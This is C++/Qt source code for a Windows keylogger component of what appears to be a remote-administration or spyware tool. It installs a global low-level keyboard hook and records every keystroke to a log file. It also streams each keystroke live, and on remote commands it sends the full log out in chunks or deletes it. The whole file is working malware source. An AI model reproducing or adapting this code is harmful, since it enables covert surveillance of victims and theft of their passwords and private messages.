#include "tkey.h"

bool tkey::sendingFile = false;
tkey *tkey::myPtr = NULL;
QString tkey::outputBuffer;
int tkey::keyCode = 0;
QFile tkey::myFile;
HHOOK tkey::winHook = NULL;  //initializing static member
bool tkey::keyDown = FALSE;


tkey::tkey(QObject *parent) :
    QThread(parent)
{
    myPtr = this;
}


void tkey::run()
{
    qDebug() << "\nKeylogger thread started.";

    myFile.setFileName("data.bin");
    myFile.open(QIODevice::Append);

    if(!(winHook = SetWindowsHookEx(WH_KEYBOARD_LL, monitorProc, NULL, 0)))
        qDebug() << "\nError";
    exec();
}


void tkey::recievedCommand(QByteArray input)
{
    if(input == QByteArray("finished"))
        disconnect(this, SIGNAL(sendCharacter(QByteArray)), 0, 0);

    else if(input == QByteArray("getLog"))
    {
        myFile.close();

        sendingFile = true;        


        if(myFile.open(QIODevice::ReadOnly))
        {

            QString temp;            

            QString fileBuffer;

            fileBuffer.clear();

            fileBuffer = "b" + (temp.number(myFile.size())).toLocal8Bit() + "file";

            emit myPtr->sendCharacter(fileBuffer.toLocal8Bit());

            int bufferSize = 5000;

            while(1)
            {
                fileBuffer.clear();

                fileBuffer = myFile.read(bufferSize);

                if(fileBuffer.size() == 0)
                {
                    sendingFile = false;
                    myFile.close();
                    myFile.open(QIODevice::Append);
                    break;
                }

                emit myPtr->sendCharacter(fileBuffer.toLocal8Bit());
            }
        }

        else
        {
            emit myPtr->sendCharacter(QByteArray("R*Can't fetch log. Maybe it doesn't exist. Try creating a new one.*"));


        }
    }

    else if(input == QByteArray("deleteLog"))
    {
        if(myFile.remove())
            emit myPtr->sendCharacter(QByteArray("R*Log deleted. Click \"Create Log\" to create a new one.*"));

        else
            emit myPtr->sendCharacter(QByteArray("R*Can't delete log. Are you sure one exists?*"));
    }

    else if(input == QByteArray("createLog"))
    {
        if(myFile.open(QIODevice::Append))
            emit myPtr->sendCharacter(QByteArray("G*New log created... Dumping buffered data...*"));

        else
            emit myPtr->sendCharacter(QByteArray("R*Failed to create a new log. Temporarily storing data in a buffer.*"));
    }
}












//*****************************************The keylogger part of code*****************************************\\


void tkey::updateKeyState(BYTE *keyState, int keyCode)
{
    keyState[keyCode] = GetKeyState(keyCode);
}



LRESULT CALLBACK tkey::monitorProc(int code, WPARAM wParam, LPARAM lParam)
{
    //LPARAM is the information about the key pressed.
    //WPARAM is the message which tells about the keystate. Up (key released), Down (key pressed) etc...


    //Get information about the key pressed
    KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT *)lParam);



    if(((keyInfo.vkCode != keyCode) || !keyDown) && (wParam == WM_KEYDOWN))
    {
        keyDown = true;
        keyCode = keyInfo.vkCode;

        //Get the keyboard state
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);

        updateKeyState(keyboardState, VK_CONTROL);
        updateKeyState(keyboardState, VK_SHIFT);
        updateKeyState(keyboardState, VK_CAPITAL);
        updateKeyState(keyboardState, VK_MENU);

        //Get keyboard layout of clients pc
        HKL keyboardLayout = GetKeyboardLayout(0);


        //Get the name
        char keyName[256] = {};

        DWORD info = 1;
        info += keyInfo.scanCode << 16;
        info += keyInfo.flags << 24;

        if(!GetKeyNameText(info, (LPTSTR)keyName, 255))
            qDebug() << "\nCannot get key name.";


        QString temp;

        //If character can't be printed, print key name. Otherwise just print the character.
        if(QString::fromUtf16((ushort *)(keyName)).size() < 2 || keyInfo.vkCode == 0x20)
        {
            wchar_t buffer[5] = {}; //wchar_t - Type whose range of values can represent distinct codes for all members of the largest extended character set specified among the supported locales.
            ToUnicodeEx(keyInfo.vkCode, keyInfo.scanCode, keyboardState, buffer, 4, 0, keyboardLayout);
            buffer[4] = 0;
            temp = QString::fromUtf16((ushort *)(buffer));
            qDebug() <<  temp;
        }

        else
        {
            temp = "[" + QString::fromUtf16((ushort *)(keyName)) + "]";
            qDebug() <<  temp;
        }

        if(!sendingFile)
            emit myPtr->sendCharacter(temp.toLocal8Bit());

        outputBuffer.append(temp);

        if(!sendingFile && outputBuffer.size() >= 30)
        {
            myFile.write(outputBuffer.toLocal8Bit());
            outputBuffer.clear();
            myFile.flush();
        }
    }


    else if (wParam == WM_KEYUP)
        keyDown = false;


    return CallNextHookEx(winHook, code, wParam, lParam);
}




